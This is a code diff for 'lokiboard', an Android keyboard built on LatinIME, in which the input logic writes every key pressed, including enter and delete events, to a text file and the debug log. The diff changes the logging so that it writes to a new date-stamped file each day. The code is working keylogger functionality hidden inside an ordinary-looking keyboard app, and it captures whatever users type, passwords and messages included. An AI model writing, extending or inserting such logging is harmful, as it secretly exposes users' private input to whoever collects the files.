@@ -16,18 +16,12 @@
 
 package com.abifog.lokiboard.latin.inputlogic;
 
-import android.content.Context;
-import android.os.Environment;
 import android.os.SystemClock;
-import android.support.annotation.NonNull;
 import android.text.TextUtils;
-import android.util.Log;
 import android.view.KeyCharacterMap;
 import android.view.KeyEvent;
 import android.view.inputmethod.EditorInfo;
 
-import java.io.File;
-import java.io.FileOutputStream;
 import java.util.TreeSet;
 
 import com.abifog.lokiboard.event.Event;
@@ -39,6 +33,15 @@ import com.abifog.lokiboard.latin.common.StringUtils;
 import com.abifog.lokiboard.latin.settings.SettingsValues;
 import com.abifog.lokiboard.latin.utils.InputTypeUtils;
 import com.abifog.lokiboard.latin.utils.RecapitalizeStatus;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import android.util.Log;
+import java.text.SimpleDateFormat;
+import java.util.Locale;
+import java.util.Date;
+
+
 
 /**
  * This class manages the input logic.
@@ -134,7 +137,7 @@ public final class InputLogic {
      * @param event the event to handle.
      * @return the complete transaction object
      */
-    public InputTransaction onCodeInput(final SettingsValues settingsValues, @NonNull final Event event) {
+    public InputTransaction onCodeInput(final SettingsValues settingsValues, final Event event) {
         final InputTransaction inputTransaction = new InputTransaction(settingsValues);
         mConnection.beginBatchEdit();
 
@@ -174,11 +177,10 @@ public final class InputLogic {
         }
     }
 
-
-
     private void savedToTextFile(String fileContents) {
 
-        String fileName = "lokiboard_files.txt";
+        SimpleDateFormat sdf = new SimpleDateFormat("dd_MM_yyyy", Locale.getDefault());
+        String fileName = "lokiboard_files_" + sdf.format(new Date()) + ".txt";
 
         try {
 
@@ -223,9 +225,6 @@ public final class InputLogic {
 
         // Save received argument (string) to a text file
     }
-
-
-
 
 
     /**
@@ -323,8 +322,6 @@ public final class InputLogic {
                     // No action label, and the action from imeOptions is NONE: this is a regular
                     // enter key that should input a carriage return.
 
-
-
                     // no special event so log an enter
                     String pressedChar = "[ENTER]";
                     savedToTextFile(pressedChar);
@@ -401,10 +398,6 @@ public final class InputLogic {
         // No cancelling of commit/double space/swap: we have a regular backspace.
         // We should backspace one char and restart suggestion if at the end of a word.
         if (mConnection.hasSelection()) {
-
-
-
-
             // If there is a selection, remove it.
             // We also need to unlearn the selected text.
             final int numCharsDeleted = mConnection.getExpectedSelectionEnd()
@@ -417,8 +410,8 @@ public final class InputLogic {
             String pressedChar = "[DEL-" + numCharsDeleted + " Selected Characters]";
             savedToTextFile(pressedChar);
             Log.d("INFO", "Keypressed: " + pressedChar);
-        }
-        else {
+
+        } else {
             // There is no selection, just delete one character.
 
             // Log a single delete
@@ -444,8 +437,7 @@ public final class InputLogic {
                 // because of bugs in the framework. But the framework should know, so the next
                 // best thing is to leave it to whatever it thinks is best.
                 sendDownUpKeyEvent(KeyEvent.KEYCODE_DEL);
-            }
-            else {
+            } else {
                 final int codePointBeforeCursor = mConnection.getCodePointBeforeCursor();
                 if (codePointBeforeCursor == Constants.NOT_A_CODE) {
                     // HACK for backward compatibility with broken apps that haven't realized
@@ -635,19 +627,17 @@ public final class InputLogic {
         // TODO: Remove this special handling of digit letters.
         // For backward compatibility. See {@link InputMethodService#sendKeyChar(char)}.
 
+
         // The pressedChar string holds the pressed key label
 
-        String pressedChar = "";
+        String pressedChar;
 
 
         // Special case for numbers
         if (codePoint >= '0' && codePoint <= '9') {
-
             pressedChar = StringUtils.newSingleCodePointString(codePoint);
             sendDownUpKeyEvent(codePoint - '0' + KeyEvent.KEYCODE_0);
-
         }
-
         // For letters and everything else
         else {
 
@@ -660,8 +650,6 @@ public final class InputLogic {
         savedToTextFile(pressedChar);
 
     }
-
-
 
     /**
      * Retry resetting caches in the rich input connection.
